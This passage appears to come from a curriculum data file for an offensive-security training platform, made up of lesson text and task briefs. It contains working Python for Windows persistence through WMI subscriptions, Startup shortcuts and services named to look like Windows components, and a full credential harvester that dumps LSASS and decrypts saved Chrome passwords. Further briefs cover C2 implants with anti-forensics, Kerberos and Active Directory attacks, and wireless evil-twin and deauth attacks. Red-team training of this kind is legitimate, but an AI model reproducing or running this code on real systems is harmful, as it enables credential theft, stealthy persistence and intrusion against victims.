$Binding = Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{{
    Filter = $Filter
    Consumer = $Consumer
}}

Write-Output "WMI subscription created"
'''

        try:
            result = subprocess.run(
                ['powershell', '-NoProfile', '-Command', ps_script],
                capture_output=True,
                text=True
            )
            return 'subscription created' in result.stdout.lower()
        except Exception as e:
            print(f"WMI subscription failed: {e}")
            return False

    def remove_wmi_subscription(self, name: str) -> bool:
        """Remove WMI event subscription"""
        ps_script = f'''
Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter "Name='{name}_Filter'" | Remove-WmiObject
Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer -Filter "Name='{name}_Consumer'" | Remove-WmiObject
Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding -Filter "Filter.Name='{name}_Filter'" | Remove-WmiObject
'''

        try:
            subprocess.run(
                ['powershell', '-NoProfile', '-Command', ps_script],
                capture_output=True
            )
            return True
        except:
            return False

    # ========== Startup Folder ==========

    def add_startup_shortcut(self, name: str) -> bool:
        """Add shortcut to Startup folder"""
        startup_path = os.path.join(
            os.environ['APPDATA'],
            r'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
        )

        shortcut_path = os.path.join(startup_path, f'{name}.lnk')

        # Create shortcut using PowerShell
        ps_script = f'''
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut("{shortcut_path}")
$Shortcut.TargetPath = "{self.payload_path}"
$Shortcut.Save()
'''

        try:
            result = subprocess.run(
                ['powershell', '-NoProfile', '-Command', ps_script],
                capture_output=True
            )
            return os.path.exists(shortcut_path)
        except:
            return False


# Usage
persistence = PersistenceManager('C:\\\\Windows\\\\Temp\\\\beacon.exe')

# User-level persistence
persistence.add_registry_run('WindowsUpdate')
persistence.add_scheduled_task('SystemHealthCheck', trigger='logon')
persistence.add_startup_shortcut('OneDriveSync')

# Admin-level persistence
persistence.add_service('WindowsDefenderUpdate', 'Windows Defender Update Service')
persistence.add_wmi_subscription('SystemMonitor', trigger='startup')
\`\`\`

### Key Concepts

- **Registry Run Keys**: Simple, user-level, survives reboot
- **Scheduled Tasks**: Flexible triggers, can run as different users
- **Services**: Run as SYSTEM, highly reliable
- **WMI Subscriptions**: Fileless after setup, very stealthy

### Practice Tasks

- [ ] Implement Registry Run key persistence
- [ ] Add RunOnce for one-time execution
- [ ] Build Scheduled Task creation with multiple triggers
- [ ] Implement XML-based task creation for more options
- [ ] Add Windows Service persistence
- [ ] Build WMI event subscription persistence
- [ ] Implement Startup folder shortcut
- [ ] Add removal functions for all techniques

### Completion Criteria

- [ ] All persistence methods install successfully
- [ ] Payload executes after reboot/logon
- [ ] Removal functions clean up completely
- [ ] Service restarts on failure
- [ ] WMI subscription triggers correctly`],
		['Add credential harvesting', 'Extract creds: dump LSASS using MiniDumpWriteDump or comsvcs.dll, parse for NTLM/Kerberos. Read browser passwords from Chrome/Firefox SQLite DBs. Access Windows Credential Manager vault.', `## Overview

Implement credential harvesting techniques to extract passwords, hashes, and tokens from compromised systems. These credentials enable lateral movement, privilege escalation, and persistent access.

### Credential Sources

\`\`\`
Source              | Credential Type    | Access Required
--------------------|-------------------|------------------
LSASS Memory        | NTLM, Kerberos    | Admin/SYSTEM
SAM Database        | NTLM hashes       | Admin/SYSTEM
Browser Storage     | Plaintext passwords| User
Credential Manager  | Plaintext/tokens  | User (limited)
DPAPI               | Various secrets   | User/Master key
\`\`\`

### Implementation

\`\`\`python
import os
import sys
import ctypes
import sqlite3
import shutil
import json
import base64
from pathlib import Path
from typing import List, Dict, Optional, Tuple
from Crypto.Cipher import AES

# Windows API definitions
kernel32 = ctypes.windll.kernel32
advapi32 = ctypes.windll.advapi32

class CredentialHarvester:
    """Windows credential harvesting techniques"""

    # ========== LSASS Dumping ==========

    def dump_lsass_minidump(self, output_path: str = None) -> Optional[str]:
        """
        Dump LSASS memory using MiniDumpWriteDump
        Requires: SeDebugPrivilege (admin)
        Parse offline with: pypykatz, mimikatz
        """
        if not output_path:
            output_path = os.path.join(os.environ['TEMP'], 'lsass.dmp')

        try:
            # Enable SeDebugPrivilege
            self._enable_privilege('SeDebugPrivilege')

            # Find LSASS PID
            lsass_pid = self._find_process('lsass.exe')
            if not lsass_pid:
                return None

            # Open LSASS process
            PROCESS_ALL_ACCESS = 0x1F0FFF
            hProcess = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, lsass_pid)
            if not hProcess:
                return None

            # Create output file
            hFile = kernel32.CreateFileW(
                output_path,
                0x10000000,  # GENERIC_ALL
                0,
                None,
                2,  # CREATE_ALWAYS
                0,
                None
            )

            # Load dbghelp.dll for MiniDumpWriteDump
            dbghelp = ctypes.windll.LoadLibrary('dbghelp.dll')

            # MiniDumpWriteDump
            MiniDumpWithFullMemory = 0x00000002
            result = dbghelp.MiniDumpWriteDump(
                hProcess,
                lsass_pid,
                hFile,
                MiniDumpWithFullMemory,
                None,
                None,
                None
            )

            kernel32.CloseHandle(hFile)
            kernel32.CloseHandle(hProcess)

            if result:
                return output_path
            return None

        except Exception as e:
            print(f"LSASS dump failed: {e}")
            return None

    def dump_lsass_comsvcs(self, output_path: str = None) -> Optional[str]:
        """
        Dump LSASS using comsvcs.dll (LOLBin technique)
        rundll32.exe C:\\windows\\system32\\comsvcs.dll MiniDump <pid> <path> full
        """
        import subprocess

        if not output_path:
            output_path = os.path.join(os.environ['TEMP'], 'lsass.dmp')

        lsass_pid = self._find_process('lsass.exe')
        if not lsass_pid:
            return None

        try:
            # Use comsvcs.dll MiniDump export
            cmd = f'rundll32.exe C:\\\\windows\\\\system32\\\\comsvcs.dll, MiniDump {lsass_pid} {output_path} full'
            result = subprocess.run(cmd, shell=True, capture_output=True)

            if os.path.exists(output_path):
                return output_path
            return None

        except Exception as e:
            print(f"comsvcs dump failed: {e}")
            return None

    def parse_lsass_dump(self, dump_path: str) -> Dict:
        """
        Parse LSASS dump file for credentials
        Uses pypykatz for parsing
        """
        try:
            from pypykatz.pypykatz import pypykatz

            mimi = pypykatz.parse_minidump_file(dump_path)

            credentials = {
                'msv': [],      # NTLM hashes
                'kerberos': [], # Kerberos tickets
                'wdigest': [],  # Plaintext (if enabled)
                'ssp': [],
                'credman': []
            }

            for luid, session in mimi.logon_sessions.items():
                user_info = {
                    'username': session.username,
                    'domain': session.domainname,
                    'logon_server': session.logon_server,
                    'logon_time': str(session.logon_time)
                }

                # MSV (NTLM)
                if session.msv_creds:
                    for msv in session.msv_creds:
                        if msv.NThash:
                            credentials['msv'].append({
                                **user_info,
                                'nt_hash': msv.NThash.hex() if msv.NThash else None,
                                'lm_hash': msv.LMHash.hex() if msv.LMHash else None
                            })

                # Kerberos tickets
                if session.kerberos_creds:
                    for krb in session.kerberos_creds:
                        if krb.tickets:
                            for ticket in krb.tickets:
                                credentials['kerberos'].append({
                                    **user_info,
                                    'ticket_type': ticket.type,
                                    'service': ticket.ServiceName
                                })

                # WDigest (plaintext if enabled)
                if session.wdigest_creds:
                    for wdigest in session.wdigest_creds:
                        if wdigest.password:
                            credentials['wdigest'].append({
                                **user_info,
                                'password': wdigest.password
                            })

            return credentials

        except ImportError:
            print("pypykatz not installed: pip install pypykatz")
            return {}

    # ========== Browser Credentials ==========

    def harvest_chrome_passwords(self) -> List[Dict]:
        """
        Extract saved passwords from Chrome
        Decrypts using DPAPI
        """
        credentials = []

        # Chrome paths
        local_state_path = os.path.join(
            os.environ['LOCALAPPDATA'],
            'Google', 'Chrome', 'User Data', 'Local State'
        )
        login_db_path = os.path.join(
            os.environ['LOCALAPPDATA'],
            'Google', 'Chrome', 'User Data', 'Default', 'Login Data'
        )

        if not os.path.exists(login_db_path):
            return credentials

        # Get encryption key from Local State
        try:
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)

            encrypted_key = base64.b64decode(
                local_state['os_crypt']['encrypted_key']
            )
            # Remove 'DPAPI' prefix
            encrypted_key = encrypted_key[5:]
            # Decrypt using DPAPI
            key = self._dpapi_decrypt(encrypted_key)

        except Exception as e:
            print(f"Failed to get Chrome key: {e}")
            return credentials

        # Copy database (Chrome locks it while running)
        temp_db = os.path.join(os.environ['TEMP'], 'chrome_logins.db')
        shutil.copy2(login_db_path, temp_db)

        # Query passwords
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.execute(
                'SELECT origin_url, username_value, password_value FROM logins'
            )

            for row in cursor.fetchall():
                url, username, encrypted_password = row

                if encrypted_password:
                    # Chrome 80+ uses AES-256-GCM
                    if encrypted_password[:3] == b'v10' or encrypted_password[:3] == b'v11':
                        password = self._decrypt_chrome_password(
                            encrypted_password, key
                        )
                    else:
                        # Old Chrome uses DPAPI directly
                        password = self._dpapi_decrypt(encrypted_password)

                    if password:
                        credentials.append({
                            'browser': 'Chrome',
                            'url': url,
                            'username': username,
                            'password': password.decode('utf-8', errors='replace')
                        })

            conn.close()
            os.remove(temp_db)

        except Exception as e:
            print(f"Chrome password extraction failed: {e}")

        return credentials

    def _decrypt_chrome_password(self, encrypted: bytes, key: bytes) -> bytes:
        """Decrypt Chrome password using AES-256-GCM"""
        try:
            # v10/v11 + 12-byte nonce + ciphertext + 16-byte tag
            nonce = encrypted[3:15]
            ciphertext = encrypted[15:-16]
            tag = encrypted[-16:]

            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            return cipher.decrypt_and_verify(ciphertext, tag)

        except Exception:
            return None

    def harvest_firefox_passwords(self) -> List[Dict]:
        """Extract saved passwords from Firefox"""
        credentials = []

        # Find Firefox profile
        profiles_path = os.path.join(
            os.environ['APPDATA'],
            'Mozilla', 'Firefox', 'Profiles'
        )

        if not os.path.exists(profiles_path):
            return credentials

        # Firefox stores in key4.db (master key) and logins.json
        for profile in os.listdir(profiles_path):
            profile_path = os.path.join(profiles_path, profile)
            logins_file = os.path.join(profile_path, 'logins.json')

            if os.path.exists(logins_file):
                try:
                    with open(logins_file, 'r') as f:
                        logins = json.load(f)

                    for login in logins.get('logins', []):
                        # Firefox passwords are encrypted with NSS
                        # Requires key4.db decryption
                        credentials.append({
                            'browser': 'Firefox',
                            'url': login.get('hostname'),
                            'username': login.get('encryptedUsername'),
                            'password': '[NSS Encrypted]',
                            'note': 'Use firefox_decrypt tool for decryption'
                        })

                except Exception as e:
                    print(f"Firefox extraction failed: {e}")

        return credentials

    # ========== Windows Credential Manager ==========

    def harvest_credential_manager(self) -> List[Dict]:
        """
        Extract credentials from Windows Credential Manager
        Uses CredEnumerateW API
        """
        credentials = []

        # Load cred functions
        advapi32 = ctypes.windll.advapi32

        # Credential types
        CRED_TYPE_GENERIC = 1
        CRED_TYPE_DOMAIN_PASSWORD = 2

        # Enumerate credentials
        count = ctypes.c_ulong()
        creds = ctypes.POINTER(ctypes.c_void_p)()

        for cred_type in [CRED_TYPE_GENERIC, CRED_TYPE_DOMAIN_PASSWORD]:
            if advapi32.CredEnumerateW(None, 0, ctypes.byref(count), ctypes.byref(creds)):
                for i in range(count.value):
                    # Parse credential structure
                    # (simplified - actual implementation needs proper struct parsing)
                    credentials.append({
                        'source': 'Credential Manager',
                        'type': 'generic' if cred_type == 1 else 'domain',
                        'note': 'Use mimikatz vault::cred for full extraction'
                    })

        return credentials

    # ========== Helper Functions ==========

    def _find_process(self, name: str) -> Optional[int]:
        """Find process PID by name"""
        import subprocess
        result = subprocess.run(
            ['tasklist', '/FI', f'IMAGENAME eq {name}', '/FO', 'CSV', '/NH'],
            capture_output=True, text=True
        )
        if name.lower() in result.stdout.lower():
            # Parse PID from output
            parts = result.stdout.strip().split(',')
            if len(parts) >= 2:
                return int(parts[1].strip('"'))
        return None

    def _enable_privilege(self, privilege: str) -> bool:
        """Enable Windows privilege for current process"""
        # Implementation using AdjustTokenPrivileges
        pass

    def _dpapi_decrypt(self, encrypted: bytes) -> bytes:
        """Decrypt data using Windows DPAPI"""
        from ctypes import wintypes

        class DATA_BLOB(ctypes.Structure):
            _fields_ = [
                ('cbData', wintypes.DWORD),
                ('pbData', ctypes.POINTER(ctypes.c_char))
            ]

        blob_in = DATA_BLOB(len(encrypted), ctypes.cast(encrypted, ctypes.POINTER(ctypes.c_char)))
        blob_out = DATA_BLOB()

        if ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)
        ):
            return ctypes.string_at(blob_out.pbData, blob_out.cbData)
        return None


# Usage
harvester = CredentialHarvester()

# Dump and parse LSASS
dump_path = harvester.dump_lsass_minidump()
if dump_path:
    creds = harvester.parse_lsass_dump(dump_path)
    print(f"Found {len(creds['msv'])} NTLM hashes")
    os.remove(dump_path)  # Cleanup

# Browser passwords
chrome_creds = harvester.harvest_chrome_passwords()
for cred in chrome_creds:
    print(f"{cred['url']}: {cred['username']}:{cred['password']}")
\`\`\`

### Key Concepts

- **LSASS**: Contains NTLM hashes, Kerberos tickets, plaintext if WDigest enabled
- **DPAPI**: Windows data protection API - master key from user password
- **Browser Storage**: SQLite DBs with encrypted passwords
- **Credential Manager**: Windows vault for saved credentials

### Practice Tasks

- [ ] Implement LSASS dump using MiniDumpWriteDump
- [ ] Add comsvcs.dll LOLBin technique
- [ ] Build LSASS parser using pypykatz
- [ ] Implement Chrome password decryption
- [ ] Add DPAPI decryption for Chrome key
- [ ] Build Firefox password extractor
- [ ] Implement Credential Manager enumeration
- [ ] Add SAM database extraction

### Completion Criteria

- [ ] LSASS dump creates valid minidump
- [ ] Parser extracts NTLM hashes successfully
- [ ] Chrome passwords decrypted correctly
- [ ] Handles locked databases (copy first)
- [ ] Cleanup removes evidence files`],
	] as [string, string, string][] },
]);

// Reimplement: Impacket Suite (87 - the second one)
expandPath(87, [
	{ name: 'Protocol Implementations', desc: 'Core protocols', tasks: [
		['Implement SMB2/3 client', 'Build SMB client handling: 1) Negotiate dialect (SMB 2.0.2, 2.1, 3.0, 3.1.1), 2) Session setup with NTLM/Kerberos, 3) Tree connect to shares (\\\\server\\share). Support signing and encryption.', '## SMB\n\nNegotiation\nSession setup\nTree connect'],
		['Build MSRPC layer', 'Implement DCE/RPC over SMB named pipes (\\pipe\\samr, \\pipe\\lsarpc). Handle bind requests with interface UUIDs, transfer syntax negotiation, and request/response marshalling using NDR format.', '## MSRPC\n\nNamed pipe transport\nInterface binding\nRequest/response'],
		['Add Kerberos client', 'Build AS-REQ/AS-REP for TGT requests (with password, hash, or certificate), TGS-REQ/TGS-REP for service tickets. Support encryption types: RC4-HMAC (23), AES128 (17), AES256 (18).', '## Kerberos\n\nAS-REQ/AS-REP\nTGS-REQ/TGS-REP\nEncryption types'],
		['Implement LDAP client', 'Build LDAP operations: simple bind (user/pass), SASL bind (GSSAPI for Kerberos), search with filters like (sAMAccountName=admin*), and modify operations for attribute changes.', '## LDAP\n\nBind operation\nSearch queries\nModify operations'],
		['Build NTLM client', 'Implement 3-message authentication: Type1 (negotiate flags, domain), Type2 (challenge, server info), Type3 (LM/NTLM response, session key). Support NTLMv1, NTLMv2, and NTLM signing/sealing.', '## NTLM\n\nNegotiate\nChallenge\nAuthenticate'],
		['Add WMI client', 'Connect via DCOM (port 135 + dynamic RPC). Query CIM classes like Win32_Process, Win32_Service. Call methods: Win32_Process::Create() for remote execution, Win32_Service::StartService().', '## WMI\n\nDCOM connection\nQuery classes\nMethod execution'],
	] as [string, string, string][] },
	{ name: 'Attack Tools', desc: 'Security tools', tasks: [
		['Build secretsdump', 'Extract: 1) SAM hashes via remote registry (HKLM\\SAM), 2) LSA secrets (service account passwords), 3) Cached domain creds (mscash2), 4) NTDS.dit via DCSync or VSS copy.', '## Secrets\n\nRemote registry\nSAM dump\nLSA secrets'],
		['Implement psexec', 'Create service remotely: 1) Upload executable to ADMIN$, 2) Create service via SVCCTL RPC, 3) Start service, 4) Capture output via named pipe. Clean up service/file afterward.', '## PSExec\n\nService creation\nCommand execution\nOutput capture'],
		['Add wmiexec', 'Execute via WMI Win32_Process.Create(). Redirect output to file on C$ share, read results, delete file. Semi-interactive shell. Stealthier than psexec (no service creation or file upload).', '## WMI\n\nWin32_Process.Create\nOutput via share\nStealthy execution'],
		['Build smbclient', 'Full SMB file operations: list shares (NetShareEnum), recursive directory listing, upload/download files with progress, delete files/directories. Support wildcards: get *.docx.', '## SMB Client\n\nList shares\nUpload/download\nDelete files'],
		['Implement GetNPUsers', 'Find users with "Do not require Kerberos preauthentication" via LDAP (userAccountControl & 0x400000). Send AS-REQ without preauth, extract encrypted timestamp for cracking (hashcat -m 18200).', '## AS-REP\n\nFind vulnerable users\nRequest AS-REP\nCrack offline'],
		['Add GetUserSPNs', 'Query LDAP for servicePrincipalName attributes on user accounts. Request TGS tickets for found SPNs, extract ticket encrypted with service account password hash for offline cracking (hashcat -m 13100).', '## Kerberoast\n\nFind SPNs\nRequest TGS\nCrack service passwords'],
	] as [string, string, string][] },
]);

// Reimplement: Pivoting & C2 (84)
expandPath(84, [
	{ name: 'Pivoting Techniques', desc: 'Network pivoting', tasks: [
		['Build SOCKS proxy', 'Implement SOCKS5 (RFC 1928) server supporting CONNECT command and optional username/password auth. Example: run on compromised host, proxychains through it to access internal 10.x.x.x networks from attacker machine.', '## SOCKS\n\nSOCKS5 server\nAuth support\nRoute through pivot'],
		['Implement port forwarding', 'Local forward (-L 8080:internal:80): listen locally, connect to internal. Remote forward (-R 4444:localhost:4444): expose local service on pivot. Dynamic (-D 1080): SOCKS proxy through tunnel.', '## Forwards\n\nLocal forward\nRemote forward\nDynamic forward'],
		['Add chisel-like tunnel', 'Build HTTP tunnel using WebSocket upgrade for bidirectional communication. Encapsulate TCP in HTTP to bypass firewalls allowing only port 80/443. Support reverse mode where client connects out.', '## HTTP Tunnel\n\nTunnel over HTTP\nFirewall bypass\nWebSocket support'],
		['Build multi-hop pivot', 'Chain pivots: Attacker → Host A → Host B → Target. Nest tunnels or use ProxyJump-style routing. Manage routes so traffic to 10.1.0.0/16 goes through Host A, 10.2.0.0/16 through Host B.', '## Multi-Hop\n\nPivot through multiple hosts\nNested tunnels\nRoute management'],
		['Implement VPN-like mode', 'Create TUN interface (tap0/tun0) on both ends. Route entire subnets (ip route add 10.0.0.0/8 via tun0). Apps use VPN transparently without SOCKS configuration. Similar to ligolo-ng.', '## VPN\n\nTUN interface\nRoute entire subnet\nTransparent access'],
		['Add DNS tunneling', 'Encode data in DNS queries (data.tunnel.attacker.com → TXT response). 63-byte label limit, ~500 bps. Use when only DNS (port 53) is allowed outbound. Tools like iodine, dnscat2 for reference.', '## DNS\n\nEncode in queries\nSlow but covert\nFirewall bypass'],
	] as [string, string, string][] },
	{ name: 'C2 Infrastructure', desc: 'Command and control', tasks: [
		['Design C2 protocol', 'Define: 1) Encryption (AES-256-GCM + RSA key exchange), 2) Authentication (implant registration with unique keys), 3) Message format (JSON with cmd, args, id fields), 4) Transport (HTTP headers, cookies, or body).', '## Protocol\n\nEncryption\nAuthentication\nCommand format'],
		['Build implant', 'Create agent with: task handlers (shell, file ops, screenshot), result queue with retry logic, anti-forensics (timestomping, log clearing), and sleep with jitter. Cross-compile for Windows/Linux/macOS.', '## Implant\n\nTask execution\nResult return\nStealth features'],
		['Implement server', 'Build server with: multiple listeners (HTTP/HTTPS/DNS/SMB), SQLite database for implants/tasks/loot, REST API for operators, and real-time updates via WebSocket. Example: Flask + SQLAlchemy backend.', '## Server\n\nListener management\nImplant tracking\nOperator interface'],
		['Add redirectors', 'Hide C2 using: 1) Domain fronting (connect to cdn.example.com, Host: c2.attacker.com), 2) Apache mod_rewrite to filter requests, 3) Cloudflare Workers for request forwarding. Rotate domains.', '## Redirectors\n\nHide real C2\nDomain fronting\nHTTP redirects'],
		['Build payload generator', 'Generate implants with embedded config (C2 URL, sleep time, jitter, kill date). Apply obfuscation: string encryption, control flow flattening, API hashing. Output as EXE, DLL, shellcode, or script.', '## Generator\n\nConfigure implant\nEmbed config\nObfuscation'],
		['Implement team collaboration', 'Multi-operator support: user authentication, shared implant sessions, role-based permissions (admin/operator/viewer), comprehensive event logging, and credential/loot sharing between operators.', '## Team\n\nShared sessions\nRole-based access\nEvent logging'],
	] as [string, string, string][] },
]);

// Reimplement: Rubeus (63)
expandPath(63, [
	{ name: 'Ticket Operations', desc: 'Kerberos ticket handling', tasks: [
		['Request TGT', 'Send AS-REQ to KDC (port 88) using: 1) password (derive AES key with string2key), 2) NTLM hash (RC4 encryption), or 3) PKCS12 certificate (PKINIT). Parse AS-REP to extract encrypted TGT.', '## TGT Request\n\nAS-REQ with password\nAS-REQ with hash\nAS-REQ with certificate'],
		['Request TGS', 'Send TGS-REQ with TGT to obtain service tickets. Specify SPN like HTTP/web.domain.com. Support S4U2Self (get ticket for any user to self), S4U2Proxy (forward ticket to another service).', '## TGS Request\n\nService ticket for SPN\nS4U2Self\nS4U2Proxy'],
		['Implement pass-the-ticket', 'Inject tickets into LSASS using LsaCallAuthenticationPackage or sekurlsa::pth. Import .kirbi/.ccache files. Use injected tickets for SMB, LDAP, HTTP authentication to domain resources.', '## PTT\n\nInject into memory\nUse for authentication\nCross-realm'],
		['Build ticket renewal', 'Extract renew-till time from ticket. Before expiry, send TGS-REQ with RENEW flag to extend lifetime. Default max renewal: 7 days. Maintain persistent access without re-authentication.', '## Renewal\n\nRenew before expiry\nMaintain access\nMaximum lifetime'],
		['Add ticket export', 'Dump tickets from LSASS memory using sekurlsa::tickets. Export as .kirbi (Windows) or .ccache (Linux) format. Extract from credential cache: klist, Rubeus dump, or mimikatz.', '## Export\n\nDump from memory\nSave to file\nKirbi format'],
		['Implement ticket parsing', 'Decode ASN.1 ticket structure. Display: service principal, encryption type, start/end/renew times. Parse PAC for user SID, group memberships, privileges. Validate signatures.', '## Parse\n\nDecode ticket\nShow PAC info\nExpiry times'],
	] as [string, string, string][] },
	{ name: 'Kerberos Attacks', desc: 'Attack techniques', tasks: [
		['Build Kerberoasting', 'Query LDAP for user accounts with servicePrincipalName. Request TGS for each SPN. Extract ticket (encrypted with service account password). Crack with hashcat -m 13100 using wordlists.', '## Kerberoast\n\nFind SPNs\nRequest TGS\nExtract for cracking'],
		['Implement AS-REP roasting', 'Find users with DONT_REQUIRE_PREAUTH (UAC 0x400000) via LDAP. Send AS-REQ without pre-auth timestamp. Extract encrypted timestamp from AS-REP. Crack with hashcat -m 18200.', '## AS-REP\n\nFind vulnerable users\nRequest AS-REP\nCrack password hash'],
		['Add overpass-the-hash', 'Convert NTLM hash to Kerberos TGT: use hash as RC4 key in AS-REQ pre-auth. Result: valid TGT usable for any Kerberos auth. Stealthier than pass-the-hash (no NTLM traffic).', '## OverPTH\n\nNTLM hash to TGT\nUse for authentication\nStealth movement'],
		['Build unconstrained delegation', 'Find computers with TRUSTED_FOR_DELEGATION. When users connect (e.g., admin RDPs in), their TGT is cached. Extract with sekurlsa::tickets. Coerce auth with PrinterBug to capture DC TGT.', '## Unconstrained\n\nMonitor for TGTs\nCapture admin tickets\nImpersonate users'],
		['Implement constrained delegation', 'Find accounts with msDS-AllowedToDelegateTo. Use S4U2Self to get ticket for any user, S4U2Proxy to forward to allowed service. Can request ticket for alternate SPN (HTTP→CIFS).', '## Constrained\n\nS4U2Self for ticket\nS4U2Proxy to target\nAlternate service name'],
		['Add resource-based delegation', 'If you can write msDS-AllowedToActOnBehalfOfOtherIdentity on target, add attacker computer SID. Use S4U2Self+S4U2Proxy from attacker account to impersonate admin to target. No SeEnableDelegation needed.', '## RBCD\n\nModify msDS-AllowedToActOnBehalfOfOtherIdentity\nS4U chain\nPrivilege escalation'],
	] as [string, string, string][] },
]);

// Reimplement Red Team Tools: Web & AD (82)
expandPath(82, [
	{ name: 'Web Attack Tools', desc: 'Web application testing', tasks: [
		['Build directory bruteforcer', 'Enumerate URIs using wordlists (dirbuster, SecLists). Filter by status code (200, 301, 403), response size, or content. Recurse into found directories. Example: find /admin/, /backup/, /.git/ directories.', '## Dirbusting\n\nWordlist enumeration\nFilter responses\nRecursive scanning'],
		['Implement parameter fuzzer', 'Discover hidden GET/POST parameters by fuzzing names (debug, admin, test) and values. Detect reflected input, error changes, or timing differences. Example: find ?debug=1 enables debug mode.', '## Param Fuzz\n\nFuzz parameter names\nFuzz values\nDetect vulns'],
		['Add XSS scanner', 'Detect XSS by: 1) Identifying context (HTML body, attribute, JS string), 2) Generating context-appropriate payloads (<script>, "onclick=, \';alert()), 3) Checking if payload executes unfiltered.', '## XSS\n\nContext detection\nPayload generation\nReflection checking'],
		['Build SQLi scanner', 'Detect SQLi: Error-based (\'syntax error), Boolean-blind (id=1 AND 1=1 vs 1=2), Time-based (SLEEP(5)). Extract data: database(), user(), tables via UNION or blind extraction one character at a time.', '## SQLi\n\nError-based\nBlind boolean\nTime-based'],
		['Implement subdomain enum', 'Discover subdomains via: 1) DNS brute force with wordlists (dev, staging, api), 2) Certificate Transparency logs (crt.sh), 3) Web archives (archive.org), 4) DNS zone transfer if allowed.', '## Subdomains\n\nDNS brute force\nCertificate transparency\nArchive search'],
		['Add credential sprayer', 'Spray credentials against: login forms (parse CSRF tokens), OAuth/OIDC endpoints, O365/Azure AD. Handle rate limits with delays and IP rotation. Detect lockout policies (5 attempts/30 min).', '## Spray\n\nLogin form spray\nOAuth spray\nRate limit handling'],
	] as [string, string, string][] },
	{ name: 'AD Attack Tools', desc: 'Active Directory attacks', tasks: [
		['Build BloodHound ingestor', 'Collect AD data: users/groups/computers via LDAP, local admin sessions via NetSessionEnum, ACLs on objects. Output BloodHound-compatible JSON. Query for attack paths like "Shortest path to Domain Admin".', '## BloodHound\n\nLDAP queries\nSession enum\nACL collection'],
		['Implement DCSync', 'Replicate credentials using DRSUAPI RPC with GetNCChanges. Requires Replicating Directory Changes rights (Domain Admins, DCs). Extract all NTLM hashes from NTDS.dit without touching the DC filesystem.', '## DCSync\n\nDRSGetNCChanges\nReplicate secrets\nNTDS extraction'],
		['Add GPO abuse', 'Find writable GPOs via ACL enumeration. Modify GPO to: add scheduled task running as SYSTEM, deploy malicious MSI, create local admin user. Changes apply at next gpupdate (90 min default).', '## GPO\n\nFind writable GPOs\nAdd scheduled task\nDeploy malware'],
		['Build delegation abuse', 'Find: unconstrained (TRUSTED_FOR_DELEGATION), constrained (msDS-AllowedToDelegateTo), RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity). Exploit to impersonate users and access resources.', '## Delegation\n\nFind delegation\nAbuse unconstrained\nRBCD attack'],
		['Implement ADCS attacks', 'ESC1: template allows SAN, attacker requests cert as admin. ESC4: modify template. ESC8: relay NTLM to CA web enrollment. Use Certipy to find misconfigs, request certs, authenticate with PKINIT.', '## ADCS\n\nESC1-ESC8\nTemplate abuse\nCertificate theft'],
		['Add persistence mechanisms', 'Golden ticket: forge TGT with krbtgt hash (10-year validity). Silver ticket: forge TGS with service hash. Skeleton key: patch LSASS on DC, any password works. AdminSDHolder: backdoor admin groups.', '## Persistence\n\nGolden ticket\nSilver ticket\nSkeleton key'],
	] as [string, string, string][] },
]);

// Reimplement: Complete Aircrack-ng Suite (88)
expandPath(88, [
	{ name: 'Wireless Capture', desc: 'Packet capture', tasks: [
		['Set up monitor mode', 'Put interface in monitor mode: airmon-ng start wlan0. This enables capturing all 802.11 frames (not just those for your MAC). Channel hop with airodump-ng or lock to specific channel for targeted capture.', '## Monitor Mode\n\nairmon-ng start wlan0\nCapture all frames\nChannel hopping'],
		['Build packet capture', 'Capture with filters: airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon. Writes to capture-01.cap. Parse pcap format (libpcap), extract 802.11 headers, data frames, and management frames.', '## Capture\n\nCapture to pcap\nFilter by BSSID\nFilter by channel'],
		['Implement deauth attack', 'Send forged deauth frames: aireplay-ng -0 5 -a <BSSID> -c <client> wlan0mon. This disconnects clients, forcing them to reconnect and capture 4-way handshake. Use sparingly to avoid detection.', '## Deauth\n\nForge deauth frames\nDisconnect clients\nCapture handshakes'],
		['Add beacon injection', 'Create fake AP: airbase-ng -e "FreeWifi" -c 6 wlan0mon. For evil twin: clone target SSID, higher signal strength wins. Captive portal captures credentials when victims try to browse.', '## Beacon\n\nCreate fake AP\nEvil twin attack\nCapture credentials'],
		['Build handshake capture', 'Capture EAPOL 4-way handshake: M1 (ANonce from AP), M2 (SNonce from client), M3, M4. Need at least M1+M2 or M2+M3 to crack. Verify with aircrack-ng -w - capture.cap (shows if handshake present).', '## Handshake\n\nCapture EAPOL frames\nDeauth to trigger\nVerify handshake'],
		['Implement PMKID capture', 'Extract PMKID from first message of handshake (RSN IE in beacon/association). No client needed: hcxdumptool -i wlan0mon -o output.pcapng. PMKID = HMAC-SHA1-128(PMK, "PMK Name" || AA || SPA).', '## PMKID\n\nCapture from AP\nNo client needed\nFaster attack'],
	] as [string, string, string][] },
	{ name: 'Password Cracking', desc: 'Offline attacks', tasks: [
		['Build WPA cracker', 'Derive PMK from password: PBKDF2-SHA1(password, SSID, 4096, 256). Derive PTK, compute MIC, compare to captured MIC. ~2000 passwords/sec on CPU. Example: aircrack-ng -w wordlist.txt capture.cap.', '## WPA Crack\n\nParse handshake\nHash with PBKDF2\nCompare PMK'],
		['Implement PMKID cracker', 'Convert capture: hcxpcapngtool -o hash.22000 capture.pcapng. Crack with hashcat: hashcat -m 22000 hash.22000 wordlist.txt. Faster than handshake: no client needed, single hash to crack.', '## PMKID Crack\n\nExtract PMKID\nHashcat mode 16800\nFaster than WPA'],
		['Add rule-based cracking', 'Apply rules to wordlist: hashcat -r rules/best64.rule. Examples: $1 (append 1), c (capitalize), r (reverse). Combines with wordlist: "password" → "Password1", "1drowssap". 10x more candidates.', '## Rules\n\nHashcat rules\nWord variations\nEfficient cracking'],
